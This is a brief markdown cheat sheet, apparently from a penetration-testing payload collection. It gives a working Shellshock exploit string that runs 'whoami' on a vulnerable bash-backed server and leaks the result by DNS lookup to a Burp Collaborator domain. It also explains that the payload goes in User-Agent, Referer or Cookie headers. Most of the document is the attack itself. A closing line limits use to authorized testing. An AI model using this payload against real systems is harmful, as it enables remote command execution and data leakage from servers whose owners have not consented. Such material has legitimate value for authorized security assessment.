# Shellshock Payloads

## Example Payload

```bash
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-DOMAIN
```

---

## Usage

Replace:

```
BURP-COLLABORATOR-DOMAIN
```

with your generated Burp Collaborator domain.

---

## Placement

Commonly inserted into:

- User-Agent
- Referer
- Cookie

(depending on the vulnerable application)

---

## Notes

Only use Shellshock payloads when testing systems that you are explicitly authorized to assess.